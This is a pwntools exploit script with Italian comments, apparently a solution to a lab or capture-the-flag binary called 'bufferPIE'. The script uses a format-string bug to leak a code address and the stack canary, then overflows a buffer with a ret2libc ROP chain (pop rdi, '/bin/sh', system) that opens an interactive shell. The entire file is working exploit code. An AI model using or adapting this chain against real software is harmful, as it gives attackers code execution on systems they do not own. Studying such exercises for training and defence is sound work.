import sys
from pwn import *


elf = context.binary = ELF('./bufferPIE')
p = process(b"./bufferPIE")
rop = ROP(elf) # Per trovare i gadget


m = p.recvuntil(b"username\n")
log.info(m)
p.sendline(b"%4$p %43$llx")
p.recvuntil(b":")
line = p.recvline().split(b" ")
address_leaked = int(line[0], 16)
canary = int(line[1], 16)

log.info(f'leaked address:{hex(address_leaked)}')
# Ottenuto debuggando con gdb, tramite info proc mappings vediamo dove è il base address
# Stampando poi l'indirizzo leakkato possiamo sottrarli per vedere l'indirizzo dopo
#   quanto si trova a partire dal base address (in questo caso 0x56bd)
elf.address = address_leaked - 0x56bd
main = elf.sym['main']
log.info(f'base:{hex(elf.address)}')
log.info(f'main:{hex(main)}')
log.success(f'Canary:{hex(canary)}')

# Trovabile andando a inserire una sequenza de Brujin, di cui si riesce a riconoscere la distanza dalla partenza
offset = b"\x41" * 520

libc_base =  0x00007ffff7dae000     # Ottenuto con      ldd buffer o con info proc mappings dentro gdb
system = libc_base + 0x50f10        # Ottenuto con      readelf -s  /usr/lib/libc.so.6 | grep "system"
bin_sh = libc_base + 0x1aae28       # Ottenuto con      strings -a -t x /usr/lib/libc.so.6| grep /bin/sh

# Gadget ottenibili con ROPgadget
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] + elf.address    # Usato per inserire la stringa "/bin/sh" in RDI
log.info(f'pop rdi found at:{hex(pop_rdi)}')
ret = (rop.find_gadget(['ret']))[0] + elf.address                   # Usato per allineare lo stack a 16 byte
log.info(f'ret found at:{hex(ret)}')

payload = offset
payload += p64(canary)
payload += p64(0x0)
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(ret)
payload += p64(system)


p.recvuntil(b":")
p.sendline(payload)
p.interactive()
